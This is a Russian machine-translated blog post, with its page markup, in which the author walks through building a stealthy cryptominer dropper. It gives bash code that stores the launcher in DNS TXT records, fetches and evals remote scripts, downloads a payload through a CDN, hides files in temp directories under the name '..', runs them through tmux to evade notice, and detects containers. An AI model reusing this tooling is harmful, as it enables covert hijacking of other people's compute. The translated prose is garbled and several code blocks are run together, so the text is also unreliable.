amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Хроники капельницы криптонот</title><script type=application/ld+json>{"url":"/ru/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ru/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-20T15:49:19.924","inLanguage":"ru","name":"","mainEntityOfPage":{"@id":"/ru/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__inner-wrap><div class=masthead__menu><a class=site-title href=/ru/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="masthead__menu-item hvr-outline-in"id=lunrSearch><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ru/posts/><i class="fas fa-pen menu-icons"></i> сообщения</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ru/media/><i class="fas fa-tv menu-icons"></i> СМИ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="masthead__menu-item hvr-outline-in"id=lunrSearch><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ru/posts/><i class="fas fa-pen menu-icons"></i> сообщения</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ru/media/><i class="fas fa-tv menu-icons"></i> СМИ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/ru/posts/chronichles_of_a_cryptonote_dropper> Хроники капельницы криптонот</a></h1><blockquote id=page-description style=font-style:italic>... Как далеко вы готовы за ... гроши?</blockquote></div><div class=franklin-content><p>Предположим, вы хотите добыть<a href=https://en.wikipedia.org/wiki/Cryptocurrency> криптовалюты</a> на удаленном<em> виртуальный</em> аппаратное обеспечение. Вам нужно найти что-нибудь для меня. Удаленные серверы - значит, нет<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> или алгоритмы проверки работы графического процессора, в основном только<a href=\posts/a-few-notes-on-proof-of-work> Дружественные к процессору монеты</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Программное обеспечение</a></h2><p>Найдите и найдите<a href=https://github.com/xmrig/xmrig> шахтер</a> , но это не очень приятно, вам нужно что-то, чем вы можете лучше управлять с пульта, поэтому вы найдете<a href=https://github.com/Bendr0id/xmrigCC> другой майнер</a> . Вы также хотите<a href=https://github.com/Bendr0id/xmrigcc-proxy> доверенное лицо</a> , потому что многие связи будут недолговечными, вы не хотите<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> дос</a> ваш майнинговый пул. Также<a href=https://github.com/search?q=tunnel> туннель</a> было бы здорово.<h2 id=the_design><a class=header-anchor href=#the_design> Дизайн</a></h2><p>Некоторые ботнеты используют данные блокчейнов для поиска команд,<a href=https://twitter.com/sarahjamielewis> кто-то</a> также, кажется, есть<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> проигранные ставки</a> на этом больше не повторится ... в любом случае мы не настолько изощрены, мы обойдемся с некоторыми записями DNS, которые хранят скрипт, который извлекает полезную нагрузку, которая самораспаковывается во временном каталоге, выполняет и оставляет<em> почти</em> никаких следов его настройки. Вот небольшая блок-схема, на которой изображена структура<h2 id=launcher><a class=header-anchor href=#launcher> Пусковая установка</a></h2><p>Смысл сценария запуска - быть доступным и легко обновляемым, чтобы он выдержал испытание временем. Обновление<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> записи просты, а DNS - это последнее, что отключается в сети ... потому что IP-адреса трудно запомнить ... так что, скорее всего, он будет доступен в большинстве случаев. Вы видите, когда мы<em> получение сценария развертывания</em>на самом деле мы уже запускаем некоторую логику, это сценарий запуска, ему нужна возможность выполнять DNS-запросы для поиска наших записей, DNS может быть повсеместным, но<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> копать землю</a> не является.<p>Здесь возникает небольшая загадка, если нам нужно загрузить другой инструмент.<em> чтобы загрузить другой скрипт, чтобы загрузить полезную нагрузку</em> мы должны просто загрузить полезную нагрузку! В защиту ... выполнение этого скриптового танца добавляет к обфускации, позволяет сохранить только одну реализацию пусковой установки (ремонтопригодность, ура), в большинстве случаев не требуется ... поэтому мы также обслуживаем<a href=https://en.wikipedia.org/wiki/Standalone_program> статически связанный</a> dig исполняемый файл для выполнения DNS-запросов, полученных либо на собственном хостинге, либо на облачном хостинге (да, есть резервные варианты, например, 3 или 4, потому что облачные службы имеют очень минимальную свободную пропускную способность, а также требуют файлов cookie или токенов доступа ... они очень скриптовые недружелюбно, целенаправленно, конечно).<p>Что в записях днс? Мы используем<a href=https://en.wikipedia.org/wiki/TXT_record> текст</a> записей в личном домене (здесь тоже есть запасные варианты). Почему именно TXT? именно они могут хранить наибольший объем данных ... обычно, поскольку это своего рода<a href=https://www.ietf.org/rfc/rfc6763.txt> рекомендуемые</a> в зависимости от<em> вещи</em> . Мы специально используем<a href=https://www.cloudflare.com/> облачная вспышка</a> для нашей возни с DNS, поскольку он бесплатный и практически единственный игрок в городе (<em> ну не совсем, но любые другие альтернативы бледнеют</em> ). Бывает, что вы можете хранить несколько фрагментов данных на<em> тем же</em> запись ... это начинает сбивать с толку и мешать поиску некоторых спецификаций ... (касательная) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> привыкший</a> разрешать<em> прикованный</em>TXT-записи на общую сумму ~ 9 Кбайт, в документах теперь указано ~ 2 Кбайт, до изменения я использовал ~ 6 Кбайт, я думаю, и обслуживал скрипт без сжатия, после этого мне пришлось проредить скрипт и сжать его перед рукой (на самом деле я пытался использовать<a href=https://freedns.afraid.org/> Freedns</a> провайдера, меня забанили в течение одного дня, предположив, что у них есть строгая политика безжирных записей TXT), однако сжатие gzip, похоже, НЕ поддерживает конвейер и все еще вызывает проблемы, поэтому мне пришлось втиснуть скрипт без сжатия ( касательная к концу).<p>Как мы его храним? Записи TXT поддерживают только буквенно-цифровые строки, нет<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , поэтому мы должны обернуть его в ненулевую кодировку,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> удовлетворяет этому ограничению, и поскольку мы храним<em> прикованный</em> TXT, мы должны разбить вывод, поскольку мы используем материал оболочки, это делается через<code>-w</code> flag, на busybox такой флаг отсутствовал (или был включен) в более старых версиях, что раздражало, альтернативой является использование кодировщика, связанного с openssl,<code>openssl enc -base64</code>.<p>Теперь, когда мы знаем, как хранить наш сценарий развертывания, мы сохраняем его либо с помощью<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> или вручную. Как мы это тянем? Мы упоминали, что нам нужен bindutils или наш собственный<code>dig</code> ... после выбора конечной точки обслуживания мы хотим загрузить ее, обычно то, что доступно,<a href=https://www.gnu.org/software/wget/> wget</a> или<a href=https://curl.se/> завиток</a> , wget гораздо чаще предустановлен, однако busybox обеспечивает только поддержку tls с динамическими библиотеками, поэтому вы должны убедиться, что конечная точка обслуживает http или ваша утилита<code>wget</code> из gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Это значит попробовать<code>-t2</code> время ожидания<code>-T10</code> секунды быть<code>-q</code> тихое чтение из<code>-i-</code> стандартный ввод (<code>$digurl</code> ) и писать в<code>-O-</code> стандартный вывод (<code>$filename</code>). Эта команда на первый взгляд не показывает, что мы загружаем. Мы собираемся быть очень осторожными с другими командами оболочки по той же причине или придерживаться оболочки (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> трепать</a> ) встроенные, где это возможно. Также позаботьтесь о том, где вы загружаете свои исполняемые файлы, вы хотите убедиться, что вы можете их выполнить, поскольку некоторые точки монтирования, особенно в контейнерах и<code>tmp</code> пути<code>noexec</code> . Теперь, когда у нас есть инструмент для запросов DNS, мы получаем наши записи.<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Флаги здесь говорят сами за себя,<code>+short</code> просто означает, что нас интересуют только сами данные, поэтому нам не нужно анализировать вывод. Важно указать DNS-сервер, например google (<code>8.8.8.8</code> ) или облачная вспышка (<code>1.1.1.1</code> ), потому что многие среды по умолчанию перенаправляют или проксируют DNS-запросы на свои DNS-серверы. После получения фрагментированного скрипта мы обрабатываем кавычки и пробелы, чтобы подготовить его к декодированию.<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Что, если теперь мы<em> еще</em> нет нашей пусковой установки? DNS беспорядочный, нам нужен запасной вариант, давайте настроим поддомен для непосредственной загрузки скрипта запуска. Прежде чем оценивать наш скрипт, мы хотим настроить его с некоторыми переменными, снова давайте использовать запись TXT для хранения списка переменных NAME = VALUE и его синтаксического анализа. Существует также резерв для переменных, cloudflare предлагает перенаправления на основе URL-адресов, эти перенаправления обслуживаются<em> до</em> пункт назначения, поэтому нам не нужна конечная точка, мы просто хотим настроить правила перенаправления на основе регулярных выражений на фиктивную конечную точку, нас интересуют параметры URL-адреса<code>?NAME=VALUE&NAME2=VALUE2...</code>, чтобы мы могли параметризовать нашу программу запуска, просто изменив URL-адрес перенаправления, всегда уделяя внимание цитированию и избеганию кодов<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>WGET<code>-S</code> печатает URL-адрес перенаправления, который нас интересует для анализа. Имея параметры и скрипт, мы оцениваем переменные, записывая их в файл.<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Этот файл будет получен скриптом развертывания. Последняя часть сценария запуска - это актуальная<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> батут</a> , оцените сценарий в текущем процессе оболочки или, возможно, позвольте ему управлять tmux, если это возможно.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Сценарий запуска выгружается в файл с именем "..", это выглядит сбивающим с толку, поскольку его можно ошибочно принять за<em> родитель</em> каталог. И мы не включаем команду сеанса, поскольку она задерживается в команде процесса, вместо этого мы заранее запускаем сеанс tmux и отправляем исходную команду через интерфейс терминала tmux. В связи с этим иногда вызов исполняемого файла с<code>./</code> сохраняет эти символы в команде, поэтому лучше добавить<code>$PWD</code> к тропе ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Полезная нагрузка</a></h2><p>Наш сценарий развертывания начинается с поиска<code>env.sh</code> файл и сохраняя или настраивая переменные как<code>STARTING_*</code> вары как<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Это позволяет нам убить и перезапустить запущенный экземпляр при сбросе окружения. Давайте переключимся в каталог tmp с возможностями exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Проверка, если в пределах<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> контейнер</a> также удобно, мы можем исследовать файловую систему на предмет подсказок<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Теперь пришло время загрузить нашу полезную нагрузку, мы выбрали поддержку как wget, так и curl, мы уже знаем, как использовать wget с осторожными флагами, для curl это немного другое. Нам нужно создать файл конфигурации и переопределить<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Последний шаг - просто извлечь полезную нагрузку<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Стоит упомянуть об использовании [CDN] для обслуживания полезной нагрузки. И здесь cloudflare спасает нас от расходов на полосу пропускания. Просто переименовав нашу сжатую полезную нагрузку в<em> расширение файла</em> поддерживается cloudflare ... он кэшируется. Cloudflare не проверяет заголовки того, что он обслуживает, возможно, потому, что делать это в таком масштабе просто непрактично.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Приключения по Башленду</a></h2><p>Bash был выбран исходя из предположения, что он переносимый, не выглядит слишком неуместным и более распространен по сравнению с другими языками сценариев, такими как perl, ruby ​​или python. Правда в том, что автономный двоичный файл, написанный на golang или lua, был бы намного проще, с меньшим количеством ошибок и более простым в обслуживании, в основном bash был худшим вариантом, в мою защиту, к тому времени, когда я поцарапал так много зуда с помощью bash , было уже слишком поздно для переписывания, и это тоже становилось скучно.<p>Также была возможность использовать busybox с флагом времени компиляции для использования всех встроенных функций (например, grep и sed), однако использование встроенных команд таким образом не позволяет создавать задания (fork) и подвергает демон потенциальным взаимоблокировкам.<p>Здесь я опишу некоторые функции bash с полным списком.<a href=\assets/posts/bash_functions.txt> здесь</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Использовать<code>RANDOM</code> переменная, чтобы получить число от 97 до 122, соответствующее коду символа, printf должен быть встроенным, мы не хотим выполнять разветвление внутри цикла.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Используйте каналы для создания анонимных файловых дескрипторов, они не ведут себя точно так же, как файловые дескрипторы, но они достаточно хороши для<a href=https://en.wikipedia.org/wiki/Inter-process_communication> МПК</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Спящий режим без разветвления, злоупотребляя функцией тайм-аута встроенной функции чтения, он использует специальный дескриптор файла, и мы должны убедиться, что он доступен, чтобы избежать завершения.<p>Есть такие функции, как<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> используются для мониторинга использования системы, все они используют Linux<code>/proc</code> файлы без таких инструментов, как<code>ps</code> , так что никакого разветвления, все в чистом виде.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Сопроцессы доступны начиная с bash<code>v4</code> , они похожи на задания, за исключением того, что у них есть имя и собственные файловые дескрипторы.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Мы пишем демон, который является долгоживущим процессом, и мы используем много файловых дескрипторов, мы действительно хотим сделать некоторые чистки, чтобы избежать<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
